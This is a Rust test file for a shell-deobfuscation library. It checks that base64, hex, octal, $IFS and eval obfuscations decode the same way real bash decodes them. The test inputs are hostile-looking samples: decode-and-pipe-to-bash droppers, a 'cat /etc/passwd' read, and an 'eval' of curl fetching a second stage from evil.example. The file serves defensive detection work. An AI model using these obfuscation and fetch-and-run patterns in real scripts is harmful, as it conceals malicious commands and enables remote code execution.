#![allow(
    clippy::expect_used,
    clippy::unwrap_used,
    clippy::panic,
    clippy::missing_panics_doc
)]

use std::process::Command;

use disrobe_pass_shell::{IndirectionReport, peel_indirection};

fn bash_path() -> Option<String> {
    for candidate in [
        "/usr/bin/bash",
        "/bin/bash",
        "C:/Program Files/Git/usr/bin/bash.exe",
        "C:/cygwin64/bin/bash.exe",
    ] {
        if std::path::Path::new(candidate).exists() {
            return Some(candidate.to_owned());
        }
    }
    let probe: std::io::Result<std::process::Output> =
        Command::new("bash").arg("--version").output();
    match probe {
        Ok(out) if out.status.success() => Some("bash".to_owned()),
        _ => None,
    }
}

fn run_decoder_only(bash: &str, decoder_snippet: &str) -> String {
    let out: std::process::Output = Command::new(bash)
        .arg("-c")
        .arg(decoder_snippet)
        .output()
        .expect("spawn bash decoder");
    assert!(
        out.status.success(),
        "decoder snippet failed: {snippet}\nstderr: {err}",
        snippet = decoder_snippet,
        err = String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).into_owned()
}

fn gnu_base64(bash: &str) -> bool {
    Command::new(bash)
        .arg("-c")
        .arg("printf x | base64 -w0")
        .output()
        .is_ok_and(|o: std::process::Output| o.status.success())
}

fn bash_has_commands(bash: &str, commands: &[&str]) -> bool {
    let check: String = commands
        .iter()
        .map(|cmd: &&str| format!("command -v {cmd} >/dev/null 2>&1"))
        .collect::<Vec<String>>()
        .join(" && ");
    Command::new(bash)
        .arg("-c")
        .arg(check)
        .output()
        .is_ok_and(|o: std::process::Output| o.status.success())
}

fn recover(input: &str) -> IndirectionReport {
    peel_indirection(input).expect("peel")
}

#[test]
fn base64_dropper_recovery_matches_real_bash_decoder() {
    let Some(bash): Option<String> = bash_path() else {
        eprintln!("skip: no on-box bash for non-circular grading");
        return;
    };
    if cfg!(target_os = "macos") || !gnu_base64(&bash) {
        eprintln!("skip: gnu base64 (-w0/-d) unavailable (e.g. macos bsd base64)");
        return;
    }
    let payload: &str = "uname -a";
    let b64: String = run_decoder_only(&bash, &format!("printf %s '{payload}' | base64 -w0"));
    let obf: String = format!("echo {b64} | base64 -d | bash");
    let ground_truth: String = run_decoder_only(&bash, &format!("echo {b64} | base64 -d"));
    let r: IndirectionReport = recover(&obf);
    assert_eq!(
        r.output.trim_end(),
        ground_truth.trim_end(),
        "recovery diverged from real bash decoder; recovered={out}",
        out = r.output
    );
}

#[test]
fn double_base64_chain_matches_real_bash_decoder() {
    let Some(bash): Option<String> = bash_path() else {
        return;
    };
    if cfg!(target_os = "macos") || !gnu_base64(&bash) {
        eprintln!("skip: gnu base64 (-w0/-d) unavailable (e.g. macos bsd base64)");
        return;
    }
    let payload: &str = "curl http://example/c";
    let inner: String = run_decoder_only(&bash, &format!("printf %s '{payload}' | base64 -w0"));
    let outer: String = run_decoder_only(&bash, &format!("printf %s '{inner}' | base64 -w0"));
    let obf: String = format!("echo {outer} | base64 -d | base64 -d | sh");
    let ground_truth: String =
        run_decoder_only(&bash, &format!("echo {outer} | base64 -d | base64 -d"));
    let r: IndirectionReport = recover(&obf);
    assert_eq!(
        r.output.trim_end(),
        ground_truth.trim_end(),
        "out={}",
        r.output
    );
}

#[test]
fn command_subst_assignment_matches_real_bash() {
    let Some(bash): Option<String> = bash_path() else {
        return;
    };
    if cfg!(target_os = "macos") || !gnu_base64(&bash) {
        eprintln!("skip: gnu base64 (-w0/-d) unavailable (e.g. macos bsd base64)");
        return;
    }
    let payload: &str = "whoami";
    let b64: String = run_decoder_only(&bash, &format!("printf %s '{payload}' | base64 -w0"));
    let obf: String = format!("CMD=$(echo {b64} | base64 -d); $CMD");
    let ground_truth: String = run_decoder_only(
        &bash,
        &format!("CMD=$(echo {b64} | base64 -d); echo \"$CMD\""),
    );
    let r: IndirectionReport = recover(&obf);
    assert!(
        r.output.contains(ground_truth.trim_end()),
        "recovered={out} expected to contain {gt}",
        out = r.output,
        gt = ground_truth.trim_end()
    );
}

#[test]
fn printf_octal_matches_real_bash() {
    let Some(bash): Option<String> = bash_path() else {
        return;
    };
    let octal: &str = r"\167\150\157\141\155\151";
    let obf: String = format!("printf '{octal}'");
    let ground_truth: String = run_decoder_only(&bash, &format!("printf '{octal}'"));
    let r: IndirectionReport = recover(&obf);
    assert_eq!(
        r.output.trim_end(),
        ground_truth.trim_end(),
        "out={}",
        r.output
    );
}

#[test]
fn xxd_hex_dropper_matches_real_bash() {
    let Some(bash): Option<String> = bash_path() else {
        return;
    };
    if !bash_has_commands(&bash, &["xxd", "tr"]) {
        eprintln!("skip: bash xxd/tr unavailable for non-circular hex oracle");
        return;
    }
    let payload: &str = "id";
    let hex: String = run_decoder_only(
        &bash,
        &format!("printf %s '{payload}' | xxd -p | tr -d '\\n'"),
    );
    let obf: String = format!("echo {hex} | xxd -r -p | bash");
    let ground_truth: String = run_decoder_only(&bash, &format!("echo {hex} | xxd -r -p"));
    let r: IndirectionReport = recover(&obf);
    assert_eq!(
        r.output.trim_end(),
        ground_truth.trim_end(),
        "out={}",
        r.output
    );
}

#[test]
fn ifs_spaced_command_recovers() {
    let Some(bash): Option<String> = bash_path() else {
        return;
    };
    let obf: &str = "c${IFS}a${IFS}t${IFS}/etc/passwd";
    let r: IndirectionReport = recover(obf);
    assert!(r.output.contains("c a t"), "out={}", r.output);
    let _ = bash;
}

#[test]
fn eval_concatenated_strings_matches_real_bash() {
    let Some(bash): Option<String> = bash_path() else {
        return;
    };
    let obf: &str = r#"a=who; b=ami; eval "$a$b""#;
    let ground_truth: String = run_decoder_only(&bash, r#"a=who; b=ami; echo "$a$b""#);
    let r: IndirectionReport = recover(obf);
    assert!(
        r.output.contains(ground_truth.trim_end()),
        "out={} expected {}",
        r.output,
        ground_truth.trim_end()
    );
}

#[test]
fn clean_control_yields_no_recovery() {
    let clean: &str =
        "#!/bin/bash\nset -euo pipefail\nfor f in *.log; do\n  gzip \"$f\"\ndone\necho done\n";
    let r: IndirectionReport = recover(clean);
    assert!(
        r.steps.is_empty(),
        "clean control must not trigger recovery; steps={:?} out={}",
        r.steps,
        r.output
    );
}

#[test]
fn runtime_dependent_curl_is_walled_not_faked() {
    let obf: &str = r#"eval "$(curl -s http://evil.example/stage2)""#;
    let r: IndirectionReport = recover(obf);
    assert!(
        r.output.contains("curl") || r.output.contains("$(curl"),
        "runtime fetch must remain symbolic, not fabricated; out={}",
        r.output
    );
}
